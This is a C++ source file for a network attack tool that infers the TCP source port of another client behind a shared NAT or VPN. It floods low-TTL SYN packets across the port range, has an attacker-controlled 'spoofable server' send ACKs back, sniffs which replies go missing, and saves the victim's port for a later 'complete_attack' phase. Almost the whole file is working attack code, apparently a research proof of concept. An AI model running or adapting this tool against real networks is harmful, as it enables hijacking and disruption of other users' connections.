#include <iostream>
#include <string>
#include <cstdio>
#include <cstdlib>
#include <unistd.h>
#include <time.h>
#include <set>
#include <map>
#include <thread>
#include <tins/tins.h>
#include "httplib.h"

using namespace std;
using namespace Tins;

set<uint16_t> recv_dports;
pthread_t mythread[2];
pthread_mutex_t mut;

uint16_t start_port = 32768, end_port = 65530;
int port_search_range = 2000;

IPv4Address remote_server_ip, attacker_private_ip;
uint16_t remote_server_port;
uint16_t guessed_client_port;
string packet_iface;
string sniff_filter;

IPv4Address spoof_server_ip;
uint16_t spoof_server_port;

bool guess_port_finished = false;
bool debug = false;

IP syn_pkts[40000];

double __get_us(struct timeval t) {
	return (t.tv_sec * 1000000 + t.tv_usec);
}

// Ask the spoofable server to send linear ACK packets back with the ports from [begin_port, begin_port+ port_search_range), for example, [32768, 34768)
void trigger_spoof_server_send_linear_acks(httplib::Client& cli, uint16_t begin_port) {
    if(debug) 
        cout << "trigger_spoof_server_send_linear_acks" << endl;
    auto res = cli.Get("/begin_port/" + to_string(begin_port));
    if(debug) 
        cout << res->status << ", " << res->body << endl;
}

// Ask the spoofable server to send targeted ACK packets back with the ports that are still not ACKed in the range of [begin_port, begin_port + port_search_range), for example, in the range of [32768, 34768), maybe 32770, 32771, ..., 33111, ... are not ACKed. Then ask the spoofable server only to send these ports.
void trigger_spoof_server_send_targeted_acks(httplib::Client& cli, uint16_t base_port, string all_increment) {
    if(debug) 
        cout << "trigger_spoof_server_send_targeted_acks" << endl;
    httplib::Params params;
    params.emplace("base_port", to_string(base_port));
    params.emplace("all_increment", all_increment);
    auto res = cli.Post("/possible_ports", params);
    if(debug) 
        cout << res->status << ", " << res->body << endl;
    params.clear();
}

// Save the guessed source port to file for the second phase to use.
void save_port_to_file() {
    ofstream fout; 
    fout.open("../complete_attack/PORT_INFER_RESULT");
    fout << "source-port: " << guessed_client_port << endl;
    fout.close(); 
    return;
}

// In this thread, we will traverse the possible source port space to determine the source port used by any other client.
void guess_port(httplib::Client& cli) {
	PacketSender sender;
	NetworkInterface iface(packet_iface); 
    guess_port_finished = false;
	struct timeval start_time, stop_time;
	gettimeofday(&start_time, NULL);
    // In each cycle we will determine the ports in the range of [begin_port, begin_port+ port_search_range)
    for (uint16_t begin_port = start_port ; begin_port < end_port; begin_port += port_search_range) {
        if (guess_port_finished || begin_port < 10000) 
            break;
        
		set<uint16_t> left_ports;
        uint16_t max_port = (begin_port + port_search_range) < end_port ? begin_port + port_search_range : end_port;
        cout << "search range:[" << begin_port << ", " << max_port << "]" <<endl;
        for (uint16_t port = begin_port; port < max_port; port++) {
            left_ports.insert(port);
        }
        map<uint16_t,int> port_to_count; // record the times when the port is guessed right.
        bool linear_packets_sent = false;
        // continue to traverse this port range until find the port 3 times or all ports are open
        while (1) { 
            set<uint16_t> sent_ports;
            if (!linear_packets_sent) { // first, send all the packets linearly, such as [32768, 34768)
                for (set<uint16_t>::iterator itset = left_ports.begin(); itset != left_ports.end(); itset++) {
                    uint16_t port = *itset;
                    sender.send(syn_pkts[port - start_port], iface);
                    sent_ports.insert(port);
                    usleep(10);
                }
                if(debug) 
                    cout << "send Linear SYNs" << endl;
                
                trigger_spoof_server_send_linear_acks(cli, begin_port); // ask the spoofable server to send linear ACKs back.
                linear_packets_sent = true;
            } else { // after that, only send the packets which are not ACKed.
                uint16_t base_port = *(left_ports.begin());
                uint16_t cur_port = base_port;
                string all_increment;
                for (set<uint16_t>::iterator itset = left_ports.begin(); itset != left_ports.end(); itset++) {
                    uint16_t port = *itset;
                    sender.send(syn_pkts[port - start_port], iface);
                    sent_ports.insert(port);
                    all_increment += to_string(port - cur_port) + ",";
                    cur_port = port;
                    usleep(10);
                }
                if(debug) 
                    cout << "send targeted SYNs" << endl;
                trigger_spoof_server_send_targeted_acks(cli, base_port, all_increment);// ask the spoofable server to send targeted ACKs back.
            }
            // left_ports = sent_ports - recv_dports
            left_ports.clear();
            pthread_mutex_lock(&mut);
            set_difference(sent_ports.begin(), sent_ports.end(), recv_dports.begin(), recv_dports.end(), inserter(left_ports, left_ports.begin()));
            pthread_mutex_unlock(&mut);

            if(debug) 
                cout << "left_ports.size(): " << left_ports.size() <<endl;
            if (left_ports.size() == 0) {
                cout << "all ports are open" << endl;
                break;
            } else {
                if (left_ports.size() == 1) {
                    uint16_t temp_port = *left_ports.begin();
                    port_to_count[temp_port] += 1;
                    if(debug) 
                        cout << "find port: " << temp_port << " for " << port_to_count[temp_port] << " times" << endl;
                    // only if we did not receive the ACK packets of this port for 3 times we consider it as the right port, i.e., the ACKs of the port have been forwarded to the victim client.
                    if (port_to_count[temp_port] >= 3) {
                        guess_port_finished = true;
                        guessed_client_port = temp_port;
                        cout << "find the client's source-port: "<< guessed_client_port << endl;
                        save_port_to_file();
                        
                        // clear the NAT mapping created by our SYN of this port.
                        IP rst_pkt = IP(remote_server_ip, attacker_private_ip) / TCP(remote_server_port, guessed_client_port);
                        rst_pkt.rfind_pdu<TCP>().set_flag(TCP::RST, 1);
                        rst_pkt.rfind_pdu<TCP>().seq(1);
                        rst_pkt.rfind_pdu<IP>().ttl(6);
                        for (int m = 0; m < 10; m++){
                            sender.send(rst_pkt, iface);
                            usleep(5);
                        }
                        if(debug) {
                            gettimeofday(&stop_time, NULL);
                            cout << "time used to guess the source port: " << (__get_us(stop_time) - __get_us(start_time)) / 1000 <<  " ms" << endl;
                        }        
                        break;
                    }
                } 
            }
        }
	}
}

// sniff to receive the ACK packets and extract the dport of the ACKs.
bool callback(const PDU &pdu) {
    const IP &ip = pdu.rfind_pdu<IP>(); 
    const TCP &tcp = pdu.rfind_pdu<TCP>(); 
	if (ip.protocol() == 6 && ip.src_addr() == remote_server_ip && ip.dst_addr() == attacker_private_ip) {
        if (tcp.sport() == remote_server_port && (tcp.flags() == TCP::ACK)) {
            if (!guess_port_finished) {
                recv_dports.insert(tcp.dport());
            }
        }
	}
    return true;
}

void sniff_packets() {
    // Construct the sniffer configuration object
    SnifferConfiguration config;
    config.set_filter(sniff_filter);
	config.set_immediate_mode(true);
    // Construct the sniffer we'll use
    Sniffer(packet_iface, config).sniff_loop(callback);
}



int main(int argc, char** argv)
{
    if (argc != 7) {
        cout << "wrong number of args ---> (attacker_private_ip, remote_server_ip, remote_server_port, spoof_server_ip, spoof_server_port, packet_iface)" << endl;
        return 0;
        //e.g., sudo ./tcp_port_infer 10.20.189.17 43.159.39.110 22 43.159.39.110 5902 tun0
    }
    attacker_private_ip = IPv4Address(argv[1]);
    remote_server_ip = IPv4Address(argv[2]);
    remote_server_port = atoi(argv[3]);
    spoof_server_ip = IPv4Address(argv[4]);
    spoof_server_port = atoi(argv[5]);
    packet_iface = argv[6];
    
    string spoof_server_config = "http://" + string(argv[4]) + ":" + string(argv[5]);
    sniff_filter = "tcp port " + string(argv[3]) + " and ip src " + argv[2];

    // initialize the SYN packets for latter use
    for (int i = 0; i < end_port - start_port ; i++) {
        syn_pkts[i] = IP(remote_server_ip, attacker_private_ip) / TCP(remote_server_port, start_port + i);
        syn_pkts[i].rfind_pdu<IP>().ttl(6);
        syn_pkts[i].rfind_pdu<TCP>().set_flag(TCP::SYN, 1);
        syn_pkts[i].rfind_pdu<TCP>().seq(1);
    }
    // connect to the spoofable server and control it to send ACK packets.
    httplib::Client cli(spoof_server_config);
    cli.set_keep_alive(true);
    cli.set_read_timeout(10, 0); // 5 seconds

    // start the sniff thread
    pthread_mutex_init(&mut, NULL);
    thread sniff_thread(sniff_packets);
    // start the main thread to guess the client source port.
    guess_port(cli);
    sleep(1);
    sniff_thread.detach();

	return 0;
}
